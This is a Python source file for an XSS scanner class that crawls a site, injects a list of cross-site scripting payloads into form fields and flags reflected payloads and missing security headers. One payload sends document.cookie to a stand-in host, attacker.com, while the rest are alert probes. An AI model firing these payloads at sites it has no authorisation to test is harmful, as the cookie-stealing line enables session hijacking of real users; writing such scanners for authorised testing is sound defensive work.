from .vulnerability_scanner import VulnerabilityScanner
import re

class XSSScanner(VulnerabilityScanner):
    def __init__(self, url):
        super().__init__(url)
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><img src=x onerror=alert("XSS")>',
            '<svg/onload=alert("XSS")>',
            '"onmouseover="alert(\'XSS\')',
            '<script>fetch("http://attacker.com?cookie="+document.cookie)</script>'
        ]
        self.xss_patterns = [
            re.compile(r'<script>.*?</script>', re.I),
            re.compile(r'on\w+\s*=.*?>', re.I),
            re.compile(r'javascript:', re.I)
        ]

    def test_xss_payload(self, url, form_details):
        """Test XSS payload in a form."""
        try:
            for input_tag in form_details["inputs"]:
                if input_tag["type"] in ["text", "search", "url", "email", "password"]:
                    for payload in self.xss_payloads:
                        data = {}
                        for input_field in form_details["inputs"]:
                            if input_field["type"] != "submit":
                                data[input_field["name"]] = payload
                        
                        if form_details["method"] == "post":
                            response = self.session.post(url, data=data)
                        else:
                            response = self.session.get(url, params=data)

                        # Check if the payload is reflected in the response
                        if self.is_xss_vulnerable(response.text, payload):
                            self.add_vulnerability(
                                f"XSS vulnerability found in form at {url}",
                                "high",
                                f"Form action: {form_details['action']}, Input: {input_tag['name']}"
                            )
                            return True
        except Exception as e:
            self.logger.error(f"Error testing XSS payload: {str(e)}")
        return False

    def is_xss_vulnerable(self, response_text, payload):
        """Check if the response contains unescaped XSS payload."""
        # Check if the payload is reflected exactly as is
        if payload in response_text:
            return True

        # Check for common XSS patterns
        for pattern in self.xss_patterns:
            if pattern.search(response_text):
                return True

        return False

    def check_response_headers(self, response):
        """Check security headers related to XSS prevention."""
        headers = response.headers
        security_headers = {
            'X-XSS-Protection': '1; mode=block',
            'Content-Security-Policy': None,
            'X-Content-Type-Options': 'nosniff'
        }

        for header, expected_value in security_headers.items():
            if header not in headers:
                self.add_vulnerability(
                    f"Missing security header: {header}",
                    "medium",
                    "HTTP Headers"
                )
            elif expected_value and headers[header] != expected_value:
                self.add_vulnerability(
                    f"Misconfigured security header: {header}",
                    "medium",
                    f"Current value: {headers[header]}, Expected: {expected_value}"
                )

    def scan_url(self):
        """Perform XSS vulnerability scan."""
        self.logger.info(f"Starting XSS scan for {self.url}")
        
        try:
            # Check main URL
            response = self.session.get(self.url)
            self.check_response_headers(response)

            # Crawl and find forms
            self.crawl()

            # Test each form
            for form in self.forms:
                form_details = self.get_form_details(form)
                self.test_xss_payload(self.url, form_details)

        except Exception as e:
            self.logger.error(f"Error during XSS scan: {str(e)}")
        finally:
            self.clean_session()

        return self.get_results()
